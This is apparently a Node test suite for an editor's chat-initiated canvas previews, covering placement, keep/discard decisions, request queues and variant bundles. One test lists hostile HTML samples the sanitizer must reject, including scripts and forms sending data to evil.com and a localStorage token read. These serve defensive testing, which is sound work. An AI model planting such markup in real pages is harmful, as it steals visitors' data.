// Checks for chat-initiated canvas previews (src/previews.js). Run: npm test
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import {
  checkPreview,
  checkPreviewHtml,
  checkPreviewRequest,
  clearPreviews,
  clearPreviewRequest,
  decidePreview,
  decidePreviews,
  lintPreviewHtml,
  placePreview,
  previewRequestText,
  previewText,
  readActivePreview,
  readPendingPreviewRequests,
  readPendingPreviews,
  readPreview,
  readPreviewRequest,
  readPreviewRequests,
  readPreviews,
  writePreviewRequest,
} from "../src/previews.js";

const tmp = () => mkdtempSync(join(tmpdir(), "edityy-previews-"));
const insert = {
  instruction: "add a pricing section",
  action: "insert",
  position: "inside-end",
  html: '<section class="pricing"><h2>Plans</h2></section>',
};

test("a preview is placed, read back, and decided", async () => {
  const root = tmp();
  assert.equal(await readActivePreview(root), null);
  const preview = await placePreview(insert, root);
  assert.match(preview.id, /^e-/);
  assert.equal(preview.status, "active");
  assert.equal((await readActivePreview(root)).id, preview.id);
  assert.equal((await readPreviews(root)).active, preview.id);
  assert.equal((await readPreview(preview.id, root)).instruction, "add a pricing section");
  assert.equal((await readPreviews(root)).history.length, 1);

  const kept = await decidePreview(preview.id, "keep", root);
  assert.equal(kept.status, "kept");
  assert.equal((await readActivePreview(root)).id, preview.id, "a kept preview stays readable for get_preview");

  await decidePreview(preview.id, "discard", root);
  assert.equal(await readActivePreview(root), null, "a discarded preview leaves the canvas path");
  assert.equal((await readPreviews(root)).history[0].status, "discarded");

  await clearPreviews(root);
  assert.equal(await readActivePreview(root), null);
  assert.deepEqual(await readPreviews(root), { active: null, history: [] });
});

test("a new preview replaces the active one and history stays capped", async () => {
  const root = tmp();
  const first = await placePreview(insert, root);
  const second = await placePreview({ ...insert, instruction: "make it darker" }, root);
  assert.equal((await readActivePreview(root)).id, second.id);
  const history = (await readPreviews(root)).history;
  assert.equal(history[0].id, second.id, "newest first");
  assert.ok(history.some((item) => item.id === first.id), "the old one stays in history");
});

test("several previews wait at once, and a batch decides them together", async () => {
  const root = tmp();
  const first = await placePreview(insert, root);
  const second = await placePreview({ ...insert, instruction: "make it darker" }, root);
  // Both wait: the page's checkbox list reads every one still up for a decision.
  const pending = await readPendingPreviews(root);
  assert.deepEqual(pending.map((one) => one.id), [second.id, first.id], "newest first");
  assert.equal(pending.length, 2);

  // Keep the newer, take the older back, in one round like the page's button does.
  const decided = await decidePreviews(
    [
      { id: first.id, keep: false },
      { id: second.id, keep: true },
    ],
    root
  );
  assert.deepEqual(decided, [
    { id: first.id, status: "discarded" },
    { id: second.id, status: "kept" },
  ]);
  assert.equal((await readPendingPreviews(root)).length, 0, "nothing is left for the page to list");
  assert.equal((await readPreviews(root)).history[0].id, second.id);
  assert.equal((await readPreviews(root)).history[0].status, "kept");
  assert.equal((await readActivePreview(root)).id, second.id, "a kept preview stays readable for get_preview");
});

test("each action checks what it needs, and nothing else passes", () => {
  const styles = {
    instruction: "thinner",
    action: "styles",
    selector: "main > div",
    variations: [
      { label: "thin", props: [{ property: "scrollbar-width", value: "thin" }] },
      { label: "words", props: [], text: "new words" },
    ],
  };
  const checked = checkPreview(styles);
  assert.equal(checked.variations[1].text, "new words");

  const bad = [
    null,
    {},
    { ...insert, instruction: "" },
    { ...insert, action: "dance" },
    { ...insert, position: "middle" },
    { ...styles, selector: "" },
    { ...styles, variations: [] },
    { ...styles, variations: [{ label: "", props: [] }] },
    { ...styles, variations: [{ label: "x", props: [], text: "   " }] },
    { instruction: "u", action: "update", selector: "p" },
    { instruction: "u", action: "remove" },
  ];
  for (const value of bad) assert.throws(() => checkPreview(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
  for (const value of ["<div>x</div>", "<DIV CLASS=\"a\">x</DIV>", "<img src=\"/a.png\" alt=\"a\">", "<a href=\"/plans\">go</a>", '<script>document.querySelector(\'#m\').classList.toggle(\'open\')</script><div>x</div>', '<div onclick="document.querySelector(\'#m\').classList.toggle(\'open\')">x</div>', '<iframe src="/embed"></iframe>', '<iframe src="https://www.youtube.com/embed/x"></iframe>', '<form action="/subscribe"><input></form>', '<div style="color: red">x</div>', "just words", "<!-- hi --><div>x</div>", '<style>@keyframes slideIn{from{opacity:0}to{opacity:1}}</style><div class="s">x</div>', '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>', '<table><tr><td>x</td></tr></table>', '<a href="data:image/png;base64,x">x</a>']) {
    assert.equal(checkPreviewHtml(value), value);
  }
  for (const value of ['<script src="https://evil.com/x.js"></script>', '<script src="/app.js"></script>', '<script>fetch("https://evil.com")</script>', '<script>localStorage.getItem("t")</script>', '<script>eval("1")</script>', '<div onclick="fetch(\'https://evil.com\')">x</div>', '<a href="javascript:go()">x</a>', '<a href="data:text/html,-x">x</a>', '<form action="https://evil.com/steal"><input></form>', '<button formaction="https://evil.com/steal">x</button>', '<iframe srcdoc="javascript:alert(1)"></iframe>', '<style>@import url("https://evil.com/x.css");</style><div>x</div>']) {
    assert.throws(() => checkPreviewHtml(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
  }
  assert.equal(checkPreview({ instruction: "u", action: "update", selector: "p", props: [{ property: "--x", value: "1" }] }).props[0].property, "--x");
});

test("lintPreviewHtml warns on bare markup and passes a spaced block", () => {
  assert.deepEqual(lintPreviewHtml('<div class="mt-12 grid gap-8 sm:grid-cols-3"><p>Hi</p></div>'), []);
  assert.ok(lintPreviewHtml("<div><p>Hi</p></div>").some((w) => w.startsWith("no spacing")));
  assert.ok(lintPreviewHtml('<div class="mt-12" style="width: 400px">x</div>').some((w) => w.startsWith("fixed pixel")));
  assert.ok(lintPreviewHtml('<div class="mt-12" style="color: #fff">x</div>').some((w) => w.startsWith("raw colour")));
  assert.ok(lintPreviewHtml('<div class="mt-12 grid grid-cols-3 gap-8">x</div>').some((w) => w.startsWith("no responsive")));
});

test("the agent reads a short preview, not the page", async () => {
  const root = tmp();
  const preview = await placePreview(insert, root);
  const text = previewText(await readPreview(preview.id, root));
  assert.match(text, new RegExp(preview.id));
  assert.match(text, /add a pricing section/);
  assert.match(text, /Anchor: end of main/);
  assert.match(text, /Plans/);
  await assert.rejects(decidePreview("e-nope", "keep", root), /Unknown preview id/);
  await assert.rejects(decidePreview(preview.id, "maybe", root), /keep or discard/);
});

test("one preview takes many elements, and a styles element takes many variations", async () => {
  const root = tmp();
  const many = Array.from({ length: 100 }, (_, i) => ({ label: `look ${i + 1}`, props: [{ property: "color", value: "red" }] }));
  const preview = await placePreview({
    instruction: "restyle two, add one",
    targets: [
      { action: "styles", selector: "h1", variations: many },
      { action: "styles", selector: "p", variations: many.slice(0, 3) },
      { action: "insert", position: "inside-end", html: "<p>new</p>" },
    ],
  }, root);
  assert.equal(preview.targets.length, 3);
  assert.equal(preview.targets[0].variations.length, 100);
  assert.equal((await readPreview(preview.id, root)).targets[2].action, "insert");
  const text = previewText(await readPreview(preview.id, root));
  assert.match(text, /look 100/);
  assert.match(text, /new/);
  assert.throws(() => checkPreview({ instruction: "x", targets: [] }), { status: 400 });
  assert.throws(() => checkPreview({ instruction: "x", targets: [{ action: "styles", selector: "h1", variations: [...many, { label: "one more", props: [] }] }] }), { status: 400 });
  assert.throws(() => checkPreview({ instruction: "x", targets: [{ action: "dance" }] }), { status: 400 });
});

test("a comment-box preview request is answered once place_preview paints", async () => {
  const root = tmp();
  assert.equal(await readPreviewRequest(root), null);
  const written = await writePreviewRequest(
    {
      id: "p-1",
      instruction: "make the heading bigger",
      element: { tag: "h1", selector: "main > h1", values: [{ property: "font-size", value: "16px" }] },
    },
    root
  );
  assert.equal(written.status, "pending");
  assert.equal(written.count, 1, "no count rides as one");
  assert.match(previewRequestText(await readPreviewRequest(root)), /make the heading bigger/);
  assert.doesNotMatch(previewRequestText(await readPreviewRequest(root)), /Variants/, "one preview says nothing of variants");
  const variedRoot = tmp();
  const varied = await writePreviewRequest(
    { id: "p-2", instruction: "add a hero", count: 5 },
    variedRoot
  );
  assert.equal(varied.count, 5);
  assert.match(previewRequestText(varied), /Variants the user asked for: 5/);
  assert.match(previewRequestText(varied), /Temporary canvas is disabled/);
  assert.throws(() => checkPreviewRequest({ id: "p-3", instruction: "x", count: 0 }), { status: 400 });
  assert.throws(() => checkPreviewRequest({ id: "p-3", instruction: "x", count: 11 }), { status: 400 });
  // The paint quotes the ask's words: only the ask with the same words is answered.
  const paint = { ...insert, instruction: "make the heading bigger" };
  const preview = await placePreview(paint, root);
  const answered = await readPreviewRequest(root);
  assert.equal(answered.status, "answered");
  assert.equal(answered.previewId, preview.id);
  await clearPreviewRequest(root);
  await assert.rejects(placePreview(paint, root), /withdrew/);
});

test("a paint with other words answers no ask and clears no card", async () => {
  const root = tmp();
  await writePreviewRequest({ id: "p-keep", instruction: "make the heading bigger" }, root);
  const preview = await placePreview(insert, root);
  assert.equal(preview.requestId, null, "other words link to no ask");
  assert.equal((await readPreviewRequest(root)).status, "pending", "the ask stays pending");
});

test("a dragged-box request carries its location, and every pending ask lists", async () => {
  const root = tmp();
  await writePreviewRequest(
    {
      id: "p-box",
      instruction: "add some flair here",
      count: 5,
      region: { left: 1006, top: 144, width: 111, height: 306, mark: 2, viewportW: 1280, viewportH: 800, pctLeft: 90.2, viewTop: 450, center: "main > section", parent: "main" },
    },
    root
  );
  await writePreviewRequest({ id: "p-el", instruction: "make the heading bigger" }, root);
  const pending = await readPendingPreviewRequests(root);
  assert.deepEqual(pending.map((one) => one.id), ["p-box", "p-el"], "oldest first");
  const text = previewRequestText(pending[0]);
  assert.match(text, /Location: region mark 2 at \(1006, 144\), 111x306px\./);
  assert.match(text, /Annotation at: 90\.2% from left, 450px from top \(viewport 1280x800\)\./);
  assert.match(text, /Center: `main > section`\./);
  assert.match(text, /Insert parent: `main`\./);
  assert.throws(() => checkPreviewRequest({ id: "p-bad", instruction: "x", region: { left: -1, top: 0, width: 1, height: 1 } }), { status: 400 });
  assert.throws(() => checkPreviewRequest({ id: "p-bad", instruction: "x", region: "hero" }), { status: 400 });
});

test("an anchorless insert lands at the drawn spot, an explicit anchor wins", async () => {
  const root = tmp();
  await writePreviewRequest(
    {
      id: "p-spot",
      instruction: "add a badge here",
      region: { left: 10, top: 20, width: 100, height: 40, parent: "main > section" },
    },
    root
  );
  const text = previewRequestText((await readPendingPreviewRequests(root))[0]);
  assert.match(text, /Suggested anchor: `main > section`, suggested position: `inside-end`\./);
  const preview = await placePreview({ instruction: "add a badge here", action: "insert", html: "<span>New</span>" }, root);
  assert.equal(preview.anchor, "main > section");
  assert.equal(preview.position, "inside-end");
  assert.equal(preview.targets[0].anchor, "main > section");
  await writePreviewRequest({ id: "p-spot-2", instruction: "add a badge there", region: { left: 10, top: 20, width: 100, height: 40, parent: "main > section" } }, root);
  const placed = await placePreview({ instruction: "add a badge there", action: "insert", anchor: "#hero", position: "after", html: "<span>New</span>" }, root);
  assert.equal(placed.anchor, "#hero", "an anchor the agent sets overrides the drawn spot");
});

test("a drawn spot between children fills before, not the end", async () => {
  const root = tmp();
  await writePreviewRequest(
    {
      id: "p-between",
      instruction: "add a card here",
      region: {
        left: 10,
        top: 20,
        width: 100,
        height: 40,
        parent: "main > div.cards",
        center: "main > div.cards > article",
        anchor: "main > div.cards > article:nth-of-type(2)",
        position: "before",
      },
    },
    root
  );
  const text = previewRequestText((await readPendingPreviewRequests(root))[0]);
  assert.match(text, /Suggested anchor: `main > div\.cards > article:nth-of-type\(2\)`, suggested position: `before`\./);
  const preview = await placePreview({ instruction: "add a card here", action: "insert", html: "<article>New</article>" }, root);
  assert.equal(preview.anchor, "main > div.cards > article:nth-of-type(2)");
  assert.equal(preview.position, "before");
  assert.throws(() => checkPreviewRequest({ id: "p-bad", instruction: "x", region: { left: 0, top: 0, width: 1, height: 1, position: "middle" } }), { status: 400 });
});

test("the first paint answers a count ask, not another waiting ask", async () => {
  const root = tmp();
  await writePreviewRequest({ id: "p-flair", instruction: "add some flair here", count: 3 }, root);
  await writePreviewRequest({ id: "p-big", instruction: "make the heading bigger" }, root);
  const paint = { ...insert, instruction: "add some flair here" };
  const first = await placePreview(paint, root);
  assert.equal(first.requestId, "p-flair");
  const waiting = await readPendingPreviewRequests(root);
  assert.deepEqual(waiting.map((one) => one.id), ["p-big"], "the first paint clears the wait");
  const done = (await readPreviewRequests(root)).find((one) => one.id === "p-flair");
  assert.equal(done.status, "answered");
  assert.deepEqual(done.previewIds, [first.id], "one ask is one row");
  const second = await placePreview(paint, root);
  assert.equal(second.requestId, null, "a later paint with the same words answers nothing");
  const other = await placePreview({ ...insert, instruction: "make the heading bigger" }, root);
  assert.deepEqual((await readPendingPreviewRequests(root)).length, 0);
  assert.equal((await readPreviewRequests(root)).find((one) => one.id === "p-big").previewId, other.id);
});

test("one ask is one edit: a bundled insert answers a count ask in one paint", async () => {
  const root = tmp();
  await writePreviewRequest({ id: "p-bundle", instruction: "add some flair here", count: 5 }, root);
  const bundled = await placePreview(
    {
      instruction: "add some flair here",
      action: "insert",
      position: "inside-end",
      variations: [
        { label: "Glow strip", html: "<p>one</p>" },
        { label: "Mini cards", html: "<p>two</p>" },
        { label: "Step pills", html: "<p>three</p>" },
        { label: "Hairline row", html: "<p>four</p>" },
        { label: "Dark banner", html: "<p>five</p>" },
      ],
    },
    root
  );
  assert.equal(bundled.linked, 5);
  assert.equal(bundled.needed, 5);
  const done = (await readPreviewRequests(root)).find((one) => one.id === "p-bundle");
  assert.equal(done.status, "answered");
  assert.deepEqual(done.previewIds, [bundled.id], "one paint is one row");
  assert.match(previewText(bundled), /Option 1: Glow strip/);
  assert.match(previewText(bundled), /Option 5: Dark banner/);
});

test("insert variants are checked: bad options and mixed forms fail", async () => {
  assert.doesNotThrow(
    () => checkPreview({ instruction: "x", action: "insert", position: "inside-end", variations: [{ label: "Only", html: "<p>x</p>" }] }),
    "one variation is one option"
  );
  assert.throws(() => checkPreview({ ...insert, variations: [{ label: "Only", html: "<p>x</p>" }] }), { status: 400 });
  assert.throws(() => checkPreview({ ...insert, variations: [{ label: "", html: "<p>x</p>" }, { label: "B", html: "<p>y</p>" }] }), { status: 400 });
  assert.throws(
    () => checkPreview({ ...insert, variations: [{ label: "A", html: "<p>x</p>" }, { label: "B", html: "<p>y</p>" }] }),
    { status: 400 },
    "html and variants together fail"
  );
  const root = tmp();
  const retry = {
    instruction: "same paint twice",
    action: "insert",
    position: "inside-end",
    variations: [{ label: "A", html: "<p>x</p>" }, { label: "B", html: "<p>y</p>" }],
  };
  await writePreviewRequest({ id: "p-retry", instruction: "same paint twice", count: 3 }, root);
  const first = await placePreview(retry, root);
  assert.equal(first.reused, false);
  assert.equal(first.linked, 2, "two bundled options link at once");
  // Simulate the old EPERM outcome: the paint landed, its link did not.
  const { readFile, writeFile } = await import("node:fs/promises");
  const { join } = await import("node:path");
  const reqPath = join(root, ".edityy", "preview-request.json");
  const queue = JSON.parse(await readFile(reqPath, "utf8"));
  queue.find((entry) => entry.id === "p-retry").previewIds = [];
  queue.find((entry) => entry.id === "p-retry").status = "pending";
  await writeFile(reqPath, JSON.stringify(queue));
  const again = await placePreview(retry, root);
  assert.equal(again.reused, true, "an identical retry reuses the paint");
  assert.equal(again.id, first.id);
  assert.equal((await readPreviews(root)).history.length, 1, "no duplicate row");
});

test("a kept preview reopens to active, and only a kept one does", async () => {
  const root = tmp();
  const preview = await placePreview(insert, root);
  assert.deepEqual(await decidePreviews([{ id: preview.id, reopen: true }], root), [], "an active preview ignores reopen");
  assert.equal((await readPreview(preview.id, root)).status, "active");
  await decidePreview(preview.id, "keep", root);
  assert.deepEqual(await decidePreviews([{ id: preview.id, reopen: true }], root), [{ id: preview.id, status: "active" }]);
  assert.equal((await readPreview(preview.id, root)).status, "active");
  assert.deepEqual(
    (await readPendingPreviews(root)).map((one) => one.id),
    [preview.id],
    "a reopened preview paints again"
  );
  await decidePreview(preview.id, "discard", root);
  assert.deepEqual(await decidePreviews([{ id: preview.id, reopen: true }], root), [], "a discarded preview never reopens");
  assert.deepEqual(await decidePreviews([{ id: "e-unknownid00000000000000000000000001", reopen: true }], root), [], "an unknown id reopens nothing");
});
